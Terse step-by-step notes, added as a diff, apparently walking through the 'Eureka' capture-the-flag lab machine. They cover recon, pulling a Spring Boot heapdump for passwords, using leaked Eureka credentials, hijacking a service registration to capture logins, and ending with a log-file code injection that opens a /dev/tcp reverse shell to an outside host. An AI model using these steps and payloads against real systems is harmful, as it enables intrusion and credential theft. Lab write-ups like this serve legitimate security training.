@@ -1,0 +1,92 @@
+Do an nmap scan
+nmap -sV -sC -vv -oA nmap Eureka 10.10.11.66
+
+
+look at the source code to see different versions and how things are built
+
+Look at the headers of the page 
+    curl -I http://furni.htb/shop
+
+make an account
+
+login to the account 
+
+turn on burpsuite abd
+
+look at the cookie and see if its a jwscookie or something like that 
+
+Look at the 404 pages and see if that gives something away 
+
+look at "oxdf 404" pages,
+
+the domain could be using spring boot framework
+
+set up gobuster directory and use wordlist /opt/SecLists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
+
+could use nuclei as well 
+
+grab the heapdump 
+wget http://furni.htb/actuator/heapdump
+
+could do a strings heapdump | grep password
+
+could do a strings heapdump | grep password | less
+
+could do strings heapdump | grep password= | less
+
+use visual vm github: https://github.com/oracle/visualvm/releases?after=2.2
+
+also use jdumpspider github 
+
+go to this port on the domain "http://furni.htb:8761/"
+put in the credentials
+
+
+do an ssh from the found credentials from line 31/37
+
+do a "find . -type f"
+
+
+cd /opt
+cat log_analysis.sh file 
+
+look for bash eq code injection: https://github.com/koalaman/shellcheck
+
+copy the log_analysis.sh and run the shellcheck against the file
+
+do a ps -ef --forest
+
+download pspy github
+https://github.com/DominicBreuker/pspy
+https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+
+on the box with ssh go to /dev/shm
+
+on host box, create python server 
+python3 -m http.server
+
+once downloaded, do a chmod +x on the downloaded file
+
+do a ./downloaded file
+
+run the file look through the output 
+
+do getent group developers
+
+grep -R miranda
+
+on local machine search hacking Eureka
+
+in terminal do: curl -u EurekaSrvr:0scarPWDisTheB3st http://10.10.11.66:8761/eureka/apps
+
+create a python script to join a Eureka LB pool called USER-MANAGEMENT-SERVICE using is there a eureka client python library and can you give me a full script that does this with flask
+
+grab the username and password
+
+su - miranda-wise
+enter password
+
+cd /var/www/web/cloud-gateway/log
+
+move the application.log to application.log~
+then echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.18/9001 0>&1 )]'
